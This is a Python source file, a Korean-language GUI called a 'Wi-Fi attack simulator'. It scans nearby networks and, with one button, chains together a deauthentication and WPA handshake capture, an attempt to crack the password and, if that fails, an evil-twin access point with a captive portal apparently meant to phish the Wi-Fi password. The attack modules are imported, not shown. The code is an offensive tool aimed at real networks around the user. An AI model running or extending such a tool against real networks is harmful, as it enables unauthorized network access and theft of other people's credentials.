import customtkinter as ctk
import threading

from core.scanner import get_wifi_list
from core.handshake_capture import capture_handshake
from core.cracker import start_crack
from core.evil_twin import start_evil_twin
from core.captive_portal import start_captive_portal

def launch_gui():
    # GUI 설정
    ctk.set_appearance_mode("light")
    ctk.set_default_color_theme("blue")

    root = ctk.CTk()
    root.title("Wi-Fi 공격 시뮬레이터")
    root.geometry("500x400")

    wifi_data = get_wifi_list()
    ssid_display_list = [f"{ap['SSID']} ({ap['BSSID']})" for ap in wifi_data if ap['SSID']]
    wifi_dropdown = ctk.CTkComboBox(root, values=ssid_display_list)
    wifi_dropdown.set("Wi-Fi 선택")
    wifi_dropdown.pack(pady=20)

    status_label = ctk.CTkLabel(root, text="상태: 대기 중")
    status_label.pack(pady=10)

    def run_attack(selected_bssid):
        selected_ap = next((ap for ap in wifi_data if ap['BSSID'] == selected_bssid), None)

        if not selected_ap:
            status_label.configure(text="AP 정보를 찾을 수 없습니다.")
            return

        ssid = selected_ap['SSID']
        bssid = selected_ap['BSSID']
        channel = selected_ap['CHAN']
        interface = "wlan0mon"
        output_file = "handshake"

        status_label.configure(text=f"{ssid}에서 deauth 및 handshake 캡처 중...")
        capture_handshake(bssid, channel, interface, output_file)

        status_label.configure(text=f"{ssid} 비밀번호 크랙 시도 중...")
        crack_result = start_crack(output_file + ".cap")

        if crack_result:
            status_label.configure(text=f"비밀번호 찾음: {crack_result}")
        else:
            status_label.configure(text="크랙 실패, Evil Twin 생성 중...")
            threading.Thread(target=start_evil_twin, args=(ssid, bssid, channel, interface), daemon=True).start()
            status_label.configure(text="Captive Portal 시작 중...")
            start_captive_portal()

    def on_attack_button_click():
        selected_text = wifi_dropdown.get()
        if not selected_text or "(" not in selected_text:
            status_label.configure(text="Wi-Fi를 선택하세요.")
            return

        selected_bssid = selected_text.split("(")[-1].rstrip(")")
        status_label.configure(text="공격 시작 중...")
        threading.Thread(target=run_attack, args=(selected_bssid,), daemon=True).start()

    attack_button = ctk.CTkButton(root, text="공격 시작", command=on_attack_button_click)
    attack_button.pack(pady=10)

    root.mainloop()
